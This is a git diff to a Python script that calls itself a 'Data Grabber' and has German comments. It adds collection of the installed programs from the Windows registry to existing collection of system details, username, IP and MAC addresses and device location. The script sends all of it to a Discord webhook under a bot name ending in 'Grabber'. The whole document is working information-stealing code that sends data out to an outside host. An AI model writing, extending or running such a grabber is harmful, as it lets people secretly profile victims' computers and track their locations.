@@ -4,7 +4,8 @@ import psutil
 import ifaddr
 import requests
 import netifaces
-import getpass  # Add this line to import getpass module
+import getpass
+import winreg
 
 def get_system_info():
     system_info = f"System: {platform.system()}\n"
@@ -14,7 +15,7 @@ def get_system_info():
     system_info += f"Processor: {platform.processor()}\n"
     system_info += f"RAM: {psutil.virtual_memory().total} bytes\n"
     system_info += f"Computer Name: {socket.gethostname()}\n"
-    system_info += f"User: {getpass.getuser()}\n"  # Include the username
+    system_info += f"User: {getpass.getuser()}\n"
     return system_info
 
 def get_ip_addresses():
@@ -44,6 +45,24 @@ def get_device_location():
         print("Failed to fetch device location:", e)
         return ""
 
+def get_installed_programs():
+    installed_programs = "Installed Programs:\n"
+    uninstall_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
+    excluded_programs = ["Microsoft", "Windows", "Update", "Security", "Hotfix", "KB"]
+    
+    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, uninstall_key) as key:
+        for i in range(winreg.QueryInfoKey(key)[0]):
+            subkey_name = winreg.EnumKey(key, i)
+            with winreg.OpenKey(key, subkey_name) as subkey:
+                try:
+                    program_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
+                    if any(exclusion in program_name for exclusion in excluded_programs):
+                        continue  # Ignoriere Systemprogramme
+                    installed_programs += f"- {program_name}\n"
+                except FileNotFoundError:
+                    continue
+    return installed_programs
+
 def send_to_discord(webhook_url):
     # Systeminformationen abrufen
     system_info = get_system_info()
@@ -57,17 +76,24 @@ def send_to_discord(webhook_url):
     # Standort abrufen
     location_info = get_device_location()
 
-    # Inhalt für Discord erstellen
-    content = f"<@ADD YOUR DISCORD ID HERE>\n{system_info}\n{ip_info}\n{mac_info}\n{location_info}"
-    
+    # Installierte Programme abrufen
+    installed_programs = get_installed_programs()
+
+    # Nachricht für Systeminformationen und Netzwerkdetails erstellen
+    content = f"<Python Data Grabber by true_lock>\n{system_info}\n{ip_info}\n{mac_info}\n{location_info}\n{installed_programs}"
+
+    # Inhalt für Discord erstellen und senden
     data = {
         "content": content,
-        "username": "System Info+Mac+Ip+Location Grabber"
+        "username": "System Info+Mac+Ip+Location+Programs Grabber"
     }
 
     response = requests.post(webhook_url, json=data)
-    print(f"Status Code: {response.status_code}, Response: {response.text}")
+    if response.status_code != 200:
+        print(f"Request failed with status code {response.status_code}: {response.text}")
+    else:
+        print("Message sent successfully to Discord.")
 
 # Beispiel für die Verwendung
-webhook_url = "ADD YOUR WEBHOOK URL HERE"
+webhook_url = "YOUR WEBHOOK URL HERE"
 send_to_discord(webhook_url)
